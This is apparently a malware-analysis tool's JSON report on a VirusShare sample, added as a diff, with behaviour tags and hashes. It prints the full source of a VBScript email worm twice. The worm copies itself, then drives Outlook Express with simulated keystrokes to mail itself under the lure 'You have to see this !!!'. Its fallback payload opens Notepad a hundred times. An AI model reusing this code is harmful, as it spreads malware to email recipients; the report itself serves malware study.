@@ -1,0 +1,71 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "Regread": "May read registry keys",
+            "Run": "May run an executable file or a system command",
+            "SendKeys": "May control another application by simulating user keystrokes",
+            "command": "May run PowerShell commands",
+            "open": "May open a file",
+            "shell": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "On Error resume next\n\nSet Mail = CreateObject(\"wscript.shell\")\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\n    M = Mail.Regread(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\CLASSES\\mailto\\shell\\open\\command\\\")\n\n    If InStr(LCase(M), \"msimn.exe\") > 1 Then\n\n    \n\n\n\n\n\tIf fso.FileExists(WScript.ScriptFullname) then\n\t\n\tfso.CopyFile WScript.ScriptFullname , \"c:\\Doomed!!!.txt.vbs\" \n \n\tMail.Run(\"C:\\Progra~1\\Outloo~1\\msimn.exe\")\n\t    \n\t\tStart = Timer\n   \t Do While Timer < Start + 10\n        \tLoop\n\n\tMail.SendKeys(\"^n%tr{TAB 3}~~%i~c:\\Doomed!!!.txt.vbs~{TAB 2}You have to see this !!!%s\"),true\n\n\n\tWscript.Echo(\"We are all Doomed!!!\")\n\n\n \n\telse\n\tend if\n\n\tSet Mail = Nothing\n\tSet fso = Nothing\n\n\n\tElse\n\tCall Crap_Pay\n\t\n\tend if\n\n\n\nPrivate Sub Crap_Pay()\n\nSet Shell = CreateObject(\"wscript.shell\")\n\nfor j = 1 to 100\n\n\tShell.Run(\"Notepad.exe\")\n\nnext\nSet Shell = Nothing\nEnd sub"
+    },
+    "filename": "VirusShare_c81495a120fe58efa2da7efcab25d063",
+    "filesize": 917,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "c81495a120fe58efa2da7efcab25d063",
+        "sha1": "027e08933300cd5a2dec1f7656a611df7c1c82e5",
+        "sha256": "483a1d0490a94cf68fcf15a1b219882caecd3abf1d5a99750070936bf74014ba"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error resume next",
+            "Set Mail = CreateObject(\"wscript.shell\")",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "    M = Mail.Regread(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\CLASSES\\mailto\\shell\\open\\command\\\")",
+            "    If InStr(LCase(M), \"msimn.exe\") > 1 Then",
+            "    ",
+            "\tIf fso.FileExists(WScript.ScriptFullname) then",
+            "\tfso.CopyFile WScript.ScriptFullname , \"c:\\Doomed!!!.txt.vbs\" ",
+            "\tMail.Run(\"C:\\Progra~1\\Outloo~1\\msimn.exe\")",
+            "\t    ",
+            "\t\tStart = Timer",
+            "   \t Do While Timer < Start + 10",
+            "        \tLoop",
+            "\tMail.SendKeys(\"^n%tr{TAB 3}~~%i~c:\\Doomed!!!.txt.vbs~{TAB 2}You have to see this !!!%s\"),true",
+            "\tWscript.Echo(\"We are all Doomed!!!\")",
+            "\telse",
+            "\tend if",
+            "\tSet Mail = Nothing",
+            "\tSet fso = Nothing",
+            "\tElse",
+            "\tCall Crap_Pay",
+            "\tend if",
+            "Private Sub Crap_Pay()",
+            "Set Shell = CreateObject(\"wscript.shell\")",
+            "for j = 1 to 100",
+            "\tShell.Run(\"Notepad.exe\")",
+            "next",
+            "Set Shell = Nothing",
+            "End sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.289432",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
